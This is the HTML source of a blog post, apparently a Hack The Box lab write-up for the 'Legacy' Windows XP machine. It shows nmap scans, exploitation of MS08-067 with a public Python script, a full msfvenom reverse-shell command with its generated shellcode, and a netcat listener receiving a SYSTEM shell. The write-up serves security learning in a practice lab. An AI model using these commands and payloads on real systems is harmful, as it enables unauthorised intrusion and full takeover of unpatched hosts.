@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <meta name="author" content="Sulejman Bijedic">
+    <meta name="description" content="Write-ups about Linux and Security">
+    <meta name="keywords" content="blog,security,linux">
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Legacy"/>
+<meta name="twitter:description" content="Machine info  OS : Windows Difficulty : Easy Points : 20 IP : 10.10.10.4  Mind Map Reconnaisance First of all, let&rsquo;s see the nmap scan result:
+Nmap scan report for 10.10.10.4 Host is up (0.068s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows XP microsoft-ds 3389/tcp closed ms-wbt-server Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp Host script results: |_clock-skew: mean: 5d00h27m38s, deviation: 2h07m16s, median: 4d22h57m38s |_nbstat: NetBIOS name: LEGACY, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:b9:36:42 (VMware) | smb-os-discovery: | OS: Windows XP (Windows 2000 LAN Manager) | OS CPE: cpe:/o:microsoft:windows_xp::- | Computer name: legacy | NetBIOS computer name: LEGACY\x00 | Workgroup: HTB\x00 |_ System time: 2020-07-04T14:49:56&#43;03:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_smb2-time: Protocol negotiation failed (SMB2) So I have as open ports only the 139 and 445."/>
+
+    <meta property="og:title" content="Legacy" />
+<meta property="og:description" content="Machine info  OS : Windows Difficulty : Easy Points : 20 IP : 10.10.10.4  Mind Map Reconnaisance First of all, let&rsquo;s see the nmap scan result:
+Nmap scan report for 10.10.10.4 Host is up (0.068s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows XP microsoft-ds 3389/tcp closed ms-wbt-server Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp Host script results: |_clock-skew: mean: 5d00h27m38s, deviation: 2h07m16s, median: 4d22h57m38s |_nbstat: NetBIOS name: LEGACY, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:b9:36:42 (VMware) | smb-os-discovery: | OS: Windows XP (Windows 2000 LAN Manager) | OS CPE: cpe:/o:microsoft:windows_xp::- | Computer name: legacy | NetBIOS computer name: LEGACY\x00 | Workgroup: HTB\x00 |_ System time: 2020-07-04T14:49:56&#43;03:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_smb2-time: Protocol negotiation failed (SMB2) So I have as open ports only the 139 and 445." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/hackthebox/legacy/" />
+<meta property="article:published_time" content="2020-06-28T16:04:02+01:00" />
+<meta property="article:modified_time" content="2020-06-28T16:04:02+01:00" />
+
+
+    
+      <base href="/posts/hackthebox/legacy/">
+    
+    <title>
+  Legacy · lafx0
+</title>
+
+    
+      <link rel="canonical" href="/posts/hackthebox/legacy/">
+    
+
+    <link href="https://fonts.googleapis.com/css?family=Lato:400,700%7CMerriweather:300,700%7CSource+Code+Pro:400,700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.11.2/css/all.css" integrity="sha384-KA6wR/X5RY4zFAHpv/CnoG2UW1uogYfdnP67Uv7eULvTveboZJg0qUpmJZb5VqzN" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" integrity="sha256-l85OmPOjvil/SOvVt3HnSSjzF1TUMyT9eV0c2BzEGzU=" crossorigin="anonymous" />
+
+    
+      
+      
+      <link rel="stylesheet" href="/css/coder.min.a4f332213a21ce8eb521670c614470c58923aaaf385e2a73982c31dd7642decb.css" integrity="sha256-pPMyITohzo61IWcMYURwxYkjqq84XipzmCwx3XZC3ss=" crossorigin="anonymous" media="screen" />
+    
+
+    
+
+    
+
+    
+      <link rel="stylesheet" href="/css/custom.css" />
+    
+
+    
+
+    
+
+    <link rel="icon" type="image/png" href="/img/favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="/img/favicon-16x16.png" sizes="16x16">
+
+    <meta name="generator" content="Hugo 0.66.0" />
+  </head>
+
+  
+  
+  <body class="colorscheme-light">
+    <main class="wrapper">
+      <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="/">
+      lafx0
+    </a>
+    
+    <input type="checkbox" id="menu-toggle" />
+    <label class="menu-button float-right" for="menu-toggle"><i class="fas fa-bars"></i></label>
+    <ul class="navigation-list">
+      
+        
+          <li class="navigation-item">
+            <a class="navigation-link" href="/posts/">Blog</a>
+          </li>
+        
+          <li class="navigation-item">
+            <a class="navigation-link" href="/about/info/">About</a>
+          </li>
+        
+      
+      
+    </ul>
+    
+  </section>
+</nav>
+
+
+      <div class="content">
+        
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">Legacy</h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fas fa-calendar"></i>
+              <time datetime='2020-06-28T16:04:02&#43;01:00'>
+                June 28, 2020
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fas fa-clock"></i>
+              5-minute read
+            </span>
+          </div>
+          
+          
+        </div>
+      </header>
+
+      <div>
+        
+        <h1 id="machine-info">Machine info</h1>
+<ul>
+<li>OS : Windows</li>
+<li>Difficulty : Easy</li>
+<li>Points : 20</li>
+<li>IP : 10.10.10.4</li>
+</ul>
+<h1 id="mind-map">Mind Map</h1>
+<p><img src="/images/htb/legacy_mindmap.png" alt="Legacy_MindMap"></p>
+<h1 id="reconnaisance">Reconnaisance</h1>
+<p>First of all, let&rsquo;s see the <code>nmap</code> scan result:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">Nmap scan report for 10.10.10.4
+Host is up (0.068s latency).
+Not shown: 997 filtered ports
+PORT     STATE  SERVICE       VERSION
+139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open   microsoft-ds  Windows XP microsoft-ds
+3389/tcp closed ms-wbt-server
+Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
+
+Host script results:
+|_clock-skew: mean: 5d00h27m38s, deviation: 2h07m16s, median: 4d22h57m38s
+|_nbstat: NetBIOS name: LEGACY, NetBIOS user: &lt;<span style="color:#f92672">unknown</span>&gt;, NetBIOS MAC: 00:50:56:b9:36:42 (VMware)
+| smb-os-discovery:
+|   OS: Windows XP (Windows 2000 LAN Manager)
+|   OS CPE: cpe:/o:microsoft:windows_xp::-
+|   Computer name: legacy
+|   NetBIOS computer name: LEGACY\x00
+|   Workgroup: HTB\x00
+|_  System time: 2020-07-04T14:49:56+03:00
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_smb2-time: Protocol negotiation failed (SMB2)</code></pre></div>
+<p>So I have as open ports only the <code>139</code> and <code>445</code>.</p>
+<h1 id="enumeration">Enumeration</h1>
+<p>Let&rsquo;s conduct a script scan versus the SMB service to see if it is vulnerable to a known exploit:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">nmap --script smb-vuln* 10.10.10.4 -p 445 -n
+
+Nmap scan report for 10.10.10.4
+Host is up (0.15s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Host script results:
+| smb-vuln-ms08-067:
+|   VULNERABLE:
+|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
+|     State: LIKELY VULNERABLE
+|     IDs:  CVE:CVE-2008-4250
+|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
+|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
+|           code via a crafted RPC request that triggers the overflow during path canonicalization.
+|           
+|     Disclosure date: 2008-10-23
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
+|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
+| smb-vuln-ms17-010:
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|           
+|     Disclosure date: 2017-03-14
+|     References:                                                                                                                                                             
+|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/                                                                         
+|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx                                                                                                    
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143</code></pre></div>
+<p><strong>-&gt;</strong> SMB appears to be vulnerable to the well known <strong>MS08-067</strong> and <strong>MS17-010</strong>. At this point I have to choose a way to proceed. I will exploit the <code>MS08-067</code> vulnerability without Metasploit.</p>
+<p><strong>Note</strong>: There are 2 modules (for both the vulnerabilities) available in Metasploit.</p>
+<h1 id="exploitation">Exploitation</h1>
+<p>After doing some research on the web, I found this python script that exploits <strong>MS08-067</strong>: <a href="https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py">https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py</a>.</p>
+<p>After reading the code, I can see that the exploit requires me to replace the default shellcode with a custom one. To make the shellcode, I use the following options in msfvenom:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.8 LPORT=443 EXITFUNC=thread -b &#34;\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40&#34; -f c -a x86 --platform windows -v shellcode
+
+Found 11 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
+Attempting to encode payload with 1 iterations of generic/none
+generic/none failed with Encoding failed due to a bad character (index=3, char=0x00)
+Attempting to encode payload with 1 iterations of x86/call4_dword_xor
+x86/call4_dword_xor succeeded with size 348 (iteration=0)
+x86/call4_dword_xor chosen with final size 348
+Payload size: 348 bytes
+Final size of c file: 1494 bytes
+unsigned char shellcode[] =
+&#34;\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e&#34;
+&#34;\x63\xad\xf8\xc0\x83\xee\xfc\xe2\xf4\x9f\x45\x7a\xc0\x63\xad&#34;
+&#34;\x98\x49\x86\x9c\x38\xa4\xe8\xfd\xc8\x4b\x31\xa1\x73\x92\x77&#34;
+&#34;\x26\x8a\xe8\x6c\x1a\xb2\xe6\x52\x52\x54\xfc\x02\xd1\xfa\xec&#34;
+&#34;\x43\x6c\x37\xcd\x62\x6a\x1a\x32\x31\xfa\x73\x92\x73\x26\xb2&#34;
+&#34;\xfc\xe8\xe1\xe9\xb8\x80\xe5\xf9\x11\x32\x26\xa1\xe0\x62\x7e&#34;
+&#34;\x73\x89\x7b\x4e\xc2\x89\xe8\x99\x73\xc1\xb5\x9c\x07\x6c\xa2&#34;
+&#34;\x62\xf5\xc1\xa4\x95\x18\xb5\x95\xae\x85\x38\x58\xd0\xdc\xb5&#34;
+&#34;\x87\xf5\x73\x98\x47\xac\x2b\xa6\xe8\xa1\xb3\x4b\x3b\xb1\xf9&#34;
+&#34;\x13\xe8\xa9\x73\xc1\xb3\x24\xbc\xe4\x47\xf6\xa3\xa1\x3a\xf7&#34;
+&#34;\xa9\x3f\x83\xf2\xa7\x9a\xe8\xbf\x13\x4d\x3e\xc5\xcb\xf2\x63&#34;
+&#34;\xad\x90\xb7\x10\x9f\xa7\x94\x0b\xe1\x8f\xe6\x64\x52\x2d\x78&#34;
+&#34;\xf3\xac\xf8\xc0\x4a\x69\xac\x90\x0b\x84\x78\xab\x63\x52\x2d&#34;
+&#34;\x90\x33\xfd\xa8\x80\x33\xed\xa8\xa8\x89\xa2\x27\x20\x9c\x78&#34;
+&#34;\x6f\xaa\x66\xc5\xf2\xca\x6d\xa5\x90\xc2\x63\xac\x43\x49\x85&#34;
+&#34;\xc7\xe8\x96\x34\xc5\x61\x65\x17\xcc\x07\x15\xe6\x6d\x8c\xcc&#34;
+&#34;\x9c\xe3\xf0\xb5\x8f\xc5\x08\x75\xc1\xfb\x07\x15\x0b\xce\x95&#34;
+&#34;\xa4\x63\x24\x1b\x97\x34\xfa\xc9\x36\x09\xbf\xa1\x96\x81\x50&#34;
+&#34;\x9e\x07\x27\x89\xc4\xc1\x62\x20\xbc\xe4\x73\x6b\xf8\x84\x37&#34;
+&#34;\xfd\xae\x96\x35\xeb\xae\x8e\x35\xfb\xab\x96\x0b\xd4\x34\xff&#34;
+&#34;\xe5\x52\x2d\x49\x83\xe3\xae\x86\x9c\x9d\x90\xc8\xe4\xb0\x98&#34;
+&#34;\x3f\xb6\x16\x18\xdd\x49\xa7\x90\x66\xf6\x10\x65\x3f\xb6\x91&#34;
+&#34;\xfe\xbc\x69\x2d\x03\x20\x16\xa8\x43\x87\x70\xdf\x97\xaa\x63&#34;
+&#34;\xfe\x07\x15&#34;;</code></pre></div>
+<p>Where:</p>
+<ul>
+<li><code>-p</code> specifies the payload I want to use</li>
+<li><code>LHOST</code> and <code>LPORT</code> are the IP address assigned to my machine</li>
+<li><code>EXITFUNC</code> appears to be an important option here, as stated in the exploit code</li>
+<li><code>-b</code> specifies the bad characters for the payload</li>
+<li><code>-f</code> specifies the output, in this case it will be <code>C</code></li>
+<li><code>-a</code> specifies the system architecture</li>
+<li><code>-v</code> specifies the variable that will store the payload</li>
+</ul>
+<p>At this point I have to edit the exploit file including my own payload and set up a listener on port 443.
+The exploit requires that I know the version of Windows and the Language Pack. Apparently the exploit takes advantage of knowing where some little bits of code will be in memory, and uses those bits on the path to shell. For different version of Windows, the addresses of those gadgets will be different.</p>
+<p>From the initial scan result I know that the system is running a <strong>Windows XP version</strong>. So I will start with target 6 first (Win XP SP3 English), and if that fails, I&rsquo;ll try others.</p>
+<p>Let&rsquo;s run the exploit: (I have already set up a netcat listener on port 443)</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">python exploit.py 10.10.10.4 6 445
+#######################################################################
+#   MS08-067 Exploit
+#   This is a modified verion of Debasis Mohanty&#39;s code (https://www.exploit-db.com/exploits/7132/).
+#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi
+#
+#   Mod in 2018 by Andy Acer
+#   - Added support for selecting a target port at the command line.
+#   - Changed library calls to allow for establishing a NetBIOS session for SMB transport
+#   - Changed shellcode handling to allow for variable length shellcode.
+#######################################################################
+
+
+$   This version requires the Python Impacket library version to 0_9_17 or newer.
+$
+$   Here&#39;s how to upgrade if necessary:
+$
+$   git clone --branch impacket_0_9_17 --single-branch https://github.com/CoreSecurity/impacket/
+$   cd impacket
+$   pip install .
+
+
+#######################################################################
+
+Windows XP SP3 English (NX)
+
+[-]Initiating connection
+[-]connected to ncacn_np:10.10.10.4[\pipe\browser]
+Exploit finish</code></pre></div>
+<p>And I get a shell:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">nc -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.14.8] from (UNKNOWN) [10.10.10.4] 1031
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\WINDOWS\system32&gt;</code></pre></div>
+<p><code>Windows XP</code> doesn&rsquo;t have a <code>whoami</code> command. So, how can I know which user am I?</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">C:\WINDOWS\system32&gt;whoami
+whoami
+&#39;whoami&#39; is not recognized as an internal or external command,
+operable program or batch file.</code></pre></div>
+<p>Kali has a <code>whoami.exe</code> by default under <code>/usr/share/windows-resources/binaries</code>/. I can share the executable with the target machine via SMB:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">python3 /opt/impacket/examples/smbserver.py whoami /usr/share/windows-binaries/
+Impacket v0.9.19 - Copyright 2018 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed</code></pre></div>
+<p>On the target:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">C:\WINDOWS\system32&gt;copy \\10.10.14.14\whoami\whoami.exe
+NT AUTHORITY\SYSTEM</code></pre></div>
+<p>I&rsquo;m already <strong>SYSTEM</strong>, so there is no need to proceed with privilege escalation!</p>
+<p><strong>Note</strong>: flags are under <code>C:\Documents and Setting\john</code> and <code>C:\Documents and Setting\Administrator</code>.</p>
+<h2 id="lessons-learned-and-remediations">Lessons learned and remediations</h2>
+<ul>
+<li>The target system appears to be vulnerable to 2 well known vulnerabilities. The administrator should have patched the system against this well known type of attacks.</li>
+</ul>
+
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+      </footer>
+    </article>
+
+    <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+  <script type="text/javascript" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/startup.js" id="MathJax-script"></script>
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [
+          ['$', '$'], ['\\(', '\\)']
+        ],
+        processEscapes: true,
+        processEnvironments: true
+      },
+      options: {
+        skipHtmlTags: ['script', 'noscript', 'style', 'textarea', 'pre']
+      }
+    };
+  </script>
+  </section>
+
+      </div>
+
+      <footer class="footer">
+  <section class="container">
+    
+      <p>'  '</p>
+    
+    
+    
+    
+  </section>
+</footer>
+
+    </main>
+
+    
+
+    
+
+  </body>
+
+</html>
